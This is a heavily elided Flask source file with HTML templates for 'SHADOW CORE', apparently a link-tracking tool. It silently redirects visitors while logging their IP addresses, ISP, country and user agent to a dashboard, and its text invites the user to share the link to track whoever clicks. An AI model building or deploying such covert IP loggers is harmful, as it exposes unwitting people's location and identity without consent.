...
Originally by: aefera
All rights reserved © afrafdhma 2024-2025
"""
...
from flask import Flask, request, render_template_string, redirect, jsonify, send_file, Response
import requests
import threading
import atexit
import subprocess
...
def index():
    ...
    # Create response
    response = redirect(CONFIG['redirect_url'])
...
<body>
    <div class="login-container">
        <div class="logo">🔒 <span>SHADOW CORE</span></div>
        ...
        {% endif %}
        <div class="info">
            v2.0 | Ngrok Optimized | by afratech
        </div>
    </div>
</body>
</html>
...
<body>
    <div class="header">
        <div>
            <h1>🔒 SHADOW CORE DASHBOARD</h1>
            <div class="header-info">
                <span class="status-indicator status-active"></span>
                System Active • {{ stats.total_visits }} visits tracked • Auto-refresh in {{ auto_refresh }}s
            </div>
        </div>
    ...
    <div class="stats-grid">
        <div class="stat-card">
            <h3>Total Visits</h3>
            <div class="number" style="color: var(--accent-blue);">{{ stats.total_visits }}</div>
        </div>
        <div class="stat-card">
            <h3>Today's Visits</h3>
            <div class="number" style="color: var(--accent-green);">{{ stats.today_visits }}</div>
        </div>
        <div class="stat-card">
            <h3>Unique IPs</h3>
            <div class="number" style="color: var(--accent-orange);">{{ stats.unique_ips }}</div>
        </div>
        <div class="stat-card">
            <h3>Countries</h3>
            <div class="number" style="color: var(--accent-purple);">{{ stats.countries }}</div>
        </div>
    </div>
    ...
    <div class="url-box">
        ...
        <small>Share this link to track visitors. All clicks will be logged here.</small>
        <div style="margin-top: 15px;">
            <button class="btn btn-primary" onclick="copyToClipboard()">📋 Copy Link</button>
            <button class="btn" onclick="newTab()">🔗 Open in New Tab</button>
        </div>
    </div>
        ...
        <table>
            ...
            <tbody>
                ...
                <tr>
                    ...
                    <td>{{ visit.isp[:20] }}{% if visit.isp|length > 20 %}...{% endif %}</td>
                    <td title="{{ visit.user_agent }}">
                        {{ visit.user_agent[:30] }}{% if visit.user_agent|length > 30 %}...{% endif %}
                    </td>
                </tr>
                {% endfor %}
            </tbody>
    ...
    <div class="footer">
        SHADOW CORE v2.0 • Ngrok Optimized • {{ stats.total_visits }} visits tracked • {{ datetime.now().strftime('%Y-%m-%d %H:%M:%S') }} | Powered by afratech
    </div>
    ...
    <script>
        ...
        function clearData() {
            if (confirm('⚠️ WARNING: This will delete ALL tracking data!\n\nAre you sure?')) {
                fetch('/clear', {
                    method: 'POST',
        ...
        setInterval(() => {
            fetch('/api/stats')
                ...
                .then(data => {
                    ...
                    document.querySelector('.stat-card:nth-child(1) .number').textContent = data.total_visits;
                    document.querySelector('.stat-card:nth-child(2) .number').textContent = data.today_visits;
                    document.querySelector('.stat-card:nth-child(3) .number').textContent = data.unique_ips;
                    document.querySelector('.stat-card:nth-child(4) .number').textContent = data.countries;
                });
        }, {{ auto_refresh }} * 1000);
    </script>
</body>
